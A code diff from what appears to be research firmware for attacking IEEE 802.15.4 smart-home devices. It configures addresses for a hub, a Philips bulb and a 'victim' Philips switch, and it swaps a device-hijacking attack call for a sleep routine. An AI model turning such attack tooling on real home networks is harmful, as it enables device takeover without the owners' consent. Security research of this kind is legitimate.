@@ -12,6 +12,11 @@
 
 #include "attack.h"
 
+ieee802154_addr hub_addr = {};
+ieee802154_addr bulb_addr = {};
+ieee802154_addr victim_addr = {};
+uint8_t attack_no = 0;
+
 int main(void)
 {
 	board_init();
@@ -36,32 +41,32 @@ int main(void)
 	_delay_ms(3000);
 
 	/** TEST FIELD **/
-	uint8_t attack_no = 3;
 	// Here we let dst_device = hub, src_device = sensor to test our API
-	ieee802154_addr hub_addr = {};
-	hub_addr.pan = 0x2ca2;
+	
+	hub_addr.pan = 0x4567;
 	hub_addr.epan = ST_EPAN_ID; // Used for Philips
-	hub_addr.short_addr = 0x1234;
-	hub_addr.long_addr = 0x12345679;
+	hub_addr.short_addr = 0x0000;
+	hub_addr.long_addr = ST_HUB_MAC_ADDR;
 	hub_addr.device_type = 0;
 	hub_addr.polling_type = 0;
 	hub_addr.coordinator_flag = 1;
-	hub_addr.beacon_update_id = 1;
+	hub_addr.beacon_update_id = 5;
 
-	ieee802154_addr bulb_addr = hub_addr;
+	bulb_addr = hub_addr;
 	bulb_addr.short_addr = 0x0005;
 	bulb_addr.long_addr = PHILIPS_BULB_MAC_ADDR;
 	bulb_addr.device_type = 1;
 	bulb_addr.polling_type = 0;
 
-	ieee802154_addr victim_addr = hub_addr;
-	victim_addr.short_addr = 0xf1e7;
+	victim_addr = hub_addr;
+	victim_addr.short_addr = 0x35c7;
 	victim_addr.long_addr = PHILIPS_SWITCH_MAC_ADDR;
 	victim_addr.polling_type = 2;
 	victim_addr.device_type = 2;
 	victim_addr.rx_when_idle = 1;
 
 	/** END OF TEST FIELD **/
+	attack_no = 3;
 
 	while (1)
 	{
@@ -84,12 +89,10 @@ int main(void)
 		}
 		else if (attack_no == 3)
 		{
-			hijacking_attack(&hub_addr, &victim_addr, 0x32000000);
-			attack_no = 0xff;
+			sleep_mode();
 		}
 		else if (attack_no == 4)
 		{
-			rx_aack_config aack_config = {};
 			attack_no = 0xff;
 		}
 		else
